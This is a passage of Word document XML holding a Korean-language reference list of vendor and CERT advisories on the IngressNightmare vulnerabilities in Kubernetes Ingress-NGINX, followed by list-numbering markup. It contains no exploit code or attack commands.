    <w:p w14:paraId="653A4CA5" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 시리즈(CVE-2025-1974, CVE-2025-24514 등) 취약점 구조, 영향, 대응 방안 상세 분석</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089B3554" w14:textId="27DDF3DE" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점 별 영향, PoC, 실제 공격 시나리오 등</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455993C2" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Aqua Security, "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Vulnerabilities: All You Need to Know", 2025-03-28.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188654D1" w14:textId="491388B0" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller에서 발견된 주요 취약점 개요, 공격 벡터, 완화 방법</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74709982" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Rapid7, "Multiple Vulnerabilities in Ingress NGINX Controller for Kubernetes", 2025-03-25.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBE0A4A" w14:textId="0D732E6B" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>영향받는</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 버전, 패치 권고, 취약점 진단 및 대응 방법</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9D684F" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CERT-EU, "Critical Vulnerabilities in Kubernetes Ingress-NGINX", 2025-03-25.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B79E13" w14:textId="23C34767" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>각 CVE별 상세 설명, CVSS 등급, 공격 성공 시 영향, 클러스터 전체 장악 가능성 등</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F383702" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Detectify</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, "Security Update: Publicly Exposed Ingress NGINX Admission", 2025-03-27.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525509C4" w14:textId="15BD5EE7" w:rsidR="00464E98" w:rsidRDefault="009E3DDA" w:rsidP="00464E98">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 시리즈 취약점의 클라우드 환경 내 실제 노출 현황, 완화 및 패치 권고</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268F11C4" w14:textId="35E8049F" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:pStyle w:val="aa"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Wiz Research: Ingress-NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>분석</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A95748" w14:textId="47738E46" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:pStyle w:val="aa"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Aqua Security: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대응</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가이드</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50863F25" w14:textId="30756215" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:pStyle w:val="aa"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Kubernetes </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공식</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>블로그</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권고</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="009E3DDA" w:rsidRPr="009E3D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Squar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A329FD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FA8E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F15BE8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4DE2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2520CD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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DE617E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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0D6597"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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231F60"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C45C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7BB405A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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CF31CE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DA301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88C1ED8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D954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94339D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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DA2351"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="101A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A093D7F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CA0E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AB91C52"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="43FC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187F45"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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8156D1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8F12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30471C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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5973F2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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B3702D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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EF55F0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="340E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8CD1C21"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="904AE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C84438"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9428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5F5E44"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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D3F3C65"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="451E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D4647E9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0B2C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1DC017E9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F9E2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E7350E4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="176C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564B6B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00483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0743E85"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8324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0AE675C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="25A0CC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17F4721"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0A9EA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2721DEA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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29A350E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1FE2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41C70A5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9442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6636018"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7228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26AD066F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ECC6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26F71CB1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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8422EE3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F610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2D804AF5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DAB61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DCA4CB3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4CEA2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E047A33"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8DFC9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E215BBA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8446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32D6FFA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="46E0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7351971"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9644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7B26916"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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7C00DCA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7896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8112E4F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7742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897289D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A9CC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9C04A75"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="80D2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C4329BD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ECB4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D077D40"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C876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D540820"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EE7A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3EC372D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C8E6A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2270658"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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37D5D0C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BB401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8676836"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4666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8A769F3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D2F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93071B5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1204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9CB379B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C7BC0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AA73B0E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7E8C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B2E6B81"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1C76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C400075"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8A7A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FB755EB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C6A0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1F57A21"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="38A2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46872AF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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5241DDC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7020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862021A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C2F0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9303D50"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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A595677"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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A9A1370"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AE62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B8C44BF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2B38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C031753"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2238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D932168"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B8483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DDD2049"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7CB8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1815EAB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0520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2BA414C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8EC6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3487DD4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0ADE4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6220533"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2E3E7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62C7471"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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6B56943"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E504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83F0517"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D44E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8903497"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="60AE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9511814"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D52E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95B1B21"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0A16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98850B8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F2C86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A0B0701"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A1467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A935810"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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BC95414"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="77D8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BCA7897"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="36FA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C3A35A5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="81807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CDB6F47"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9FE81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ECD7F86"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2AAE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F416728"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5B0C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6FA6092D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7A2E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FF31480"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6956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2310053"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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3DF1284"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2AD0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7F25486"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B496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79DB0A46"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A08A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9EF2563"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1D58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7B4C770F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9776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7BDF607D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A714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D236C6C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7C80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461775">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="18049025">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1084451576">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="2121144965">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1837961918">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="297297695">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1752661045">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1088384299">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="328214728">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="346711950">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1671523695">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1686207635">
    <w:abstractNumId w:val="106"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="806553783">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="35474607">
    <w:abstractNumId w:val="102"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="361709866">
    <w:abstractNumId w:val="53"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="179438738">
    <w:abstractNumId w:val="65"/>
  </w:num>
